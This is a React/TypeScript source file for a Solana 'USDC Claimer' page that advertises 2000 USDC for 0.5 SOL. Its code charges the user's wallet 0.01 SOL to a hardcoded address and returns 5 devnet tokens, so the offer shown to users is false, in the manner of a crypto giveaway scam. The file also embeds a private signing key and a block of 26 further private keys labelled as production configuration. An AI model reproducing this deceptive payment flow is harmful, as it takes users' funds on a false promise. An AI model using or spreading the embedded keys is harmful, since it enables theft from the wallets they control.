/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "zYwAgq7ugjJRRj1sn21eXSuuSMWB4BtMEJC6CFun8NVbEzcD9jfACfZnwBk6q1Bu2WE5ydjWxEYr5831y1LN5fM"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "66vVBUp364kA1Sw88V4FsfMhFP1TxvZzFaaxV611vXRbL3zVAiVgT4qZt4KXe8whnjz5B3SnVXLYwrFwGZbndDqT",
  "key1": "5ZUJmsbTgSbPc6rr36PpkaHioq8ZYwwTmjTZCFGUAqpvRtdZHLG8rcxMyCUCerux4nBjgyDsjzwUGbLPvHWdcasA",
  "key2": "93fAQKoDUgbGeN8bDF5AoMHYYktomVTuEw8FYQMCZU5RNgksMNv8ct9DWXesp1pNni9JJwKueG5vQzhFeqWPZ4x",
  "key3": "2448nHuWPDodmN9NyuJJ74KzJXqsKochMCafg9jZ9QqeLGHdMaW3ivWajH4kZz7yNzCYBCYovnSLTqwwxCyypk3A",
  "key4": "LHhEWfrNzBJq3w7Dn6ECLdVZv67qKprncUVD7yyHzSNrQ4T1t2UU5vjdBuMhZvKLTwjBNtch8Mbn73eM6hwXBUq",
  "key5": "3J3jJZVbn348gjGKX6JpsBH9YUQ15cYFGW8WdQa96qeAkmURiva9vmh2XnZZ9D7pfiFkwh7yfq7s4AS44dzEydtm",
  "key6": "3EqPNF7qgcyutvMzGX9w8BgYJbcVjyXNan6WyYAeovofKvA7Y8vrKWmgVHyJTjNU9QJzeTyuAsj2yYM2jSBGCT4C",
  "key7": "5cRKAMHNfjT4B6WpNoFPf99XunAhbw1vP2891AEuSdycZsukttba4HTxnuLUoBB8CN1xf7pxM58fULMx8FbospUA",
  "key8": "4S9uyu2YHaHdByDonV1XkA3sKccPpJRzRbhT4Aks34EqDz7yUyHaaZh1sZJcHixduYnAGMM4nep4U9F4mFQQXfui",
  "key9": "28gV9yGG1jjxn5HpD2YU3uokrCoD2P1hZ5i3zxP9j4wKYxt44AuxzzPKqxcUWv1dr54FbN2t7a6ziqn3xeEVUDW6",
  "key10": "2Atku74ifJ7UctBnYTQ7r1iMnzTJmvQZrBWKasD8Zsp9SXbHbGznaDENbPYkQKkhUMYVs8E9Bp3Eaz8a84DXYRHX",
  "key11": "3NjeiQmyJCaaAbkY4gqfSgMnrqMDYDN4bAhDb1kgYTDLdqYJ9vm9g3SuAmgo5EJehF2fHpVMLVbvkQ7G2WQE3oQh",
  "key12": "3gNBe7vCz3MVqoNveSqrftzFVCXxgyQsg7zPShALBdiSHjuH42XYpsu6r7YGWa4A2dN11xFSZrEPNF8gqHwVLYpi",
  "key13": "4bKcAzKYjHzxmHqKQMCSrvDXPmcit7mSjCouRNcexZDzPBFAChb98hBUtvXP9NVvqpYcNJyH42fUeb7sHwai7VQg",
  "key14": "79PhP7Qu2HytJjZ3WrrTW8SRgPJxNn7pvC8hEUbWgj7iMJ2ArG21V5s4FwYC5cdxjCQzAsbxypGTmxE7kx9uFqn",
  "key15": "1ZAh1UcQRGjDUiEDjqKjuu2QcUTeVX9aRai6CWDPEZgauuUyvgHmEyhxa9xdL433JSxLw71e5JddbbcYUJBKGT8",
  "key16": "44zzDS4RVHgyGdR1VfaWxT6pDUuPNvZHXb1B5TmXrc3o5GMsn5Gcf88sjK4CTWJbEAeArhYzhBHdrG64c1UZmESE",
  "key17": "2YJu8VvQNuk32ZdTJs8qxKuNQwKFBPpXMVatqB2L3kWURoXvHS9LXQXeZ5vYyKpUSi2wGQuXmZjdqLkvzxq9DAgy",
  "key18": "2vbhEZhpCNuQ8vcQ5UF6CwGTYKK8tsnm1o6qP6WfiGWJxmQXvymTFK5bdWKX4rUEDDQJcrvBaqWSFjWkr667MydA",
  "key19": "2ZJRHS3cndL2XAwPfKyXtWj9hkipqh3orw7cCFQ4EEyx2Xiks7NgEhJgwmD2chjm9YtPrEb5ZANgoqZcJ1xfraqw",
  "key20": "EDzmQFe9HmJLxmewESoXns4SBSwZwGRyhKicvPNnEdsmfL25hrHytsGDTB21a42byHyoH1b7uVyrbLtLE9ZVVRk",
  "key21": "ZHxCMwxmk3oyqZktMegwHdinthEDbtU6zwRtnBYGamD82vYuhRFEuKnWxMfxczfyCpmwuubRvBUtGd8PPzTJNt8",
  "key22": "5ehVgwpQ6HEs3KYfk3YBRG7QgNDsDFe1TyeURYgLmDdD6EJxvwq5SVqB7uhfiLQsbNW5YmGF92kuQNBLYuVWMSKZ",
  "key23": "3Q3j3i3id56gogpZ1yHYTweWpK42LkcUxYMUqF9s3AgNpk7tqWhYr72UN2sAWRL9648YzskBjNVgcWhtPhJzKmmA",
  "key24": "5y77jdLidRyCLMKhjjpUgf1JYuho34XhwhRxA9mdXaf4XChnh26y2oDCdMpqiRaFREVyS3tCQYnHTRXTqLaKzwfC",
  "key25": "46r5pmeQismPfBrbDGrPJn9UnBjANDywu7rHKjnJL6ccgtEkhH1B2WeSyJfmUkyYmiPdiLo7qVWzf1XVfY86BBAd"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
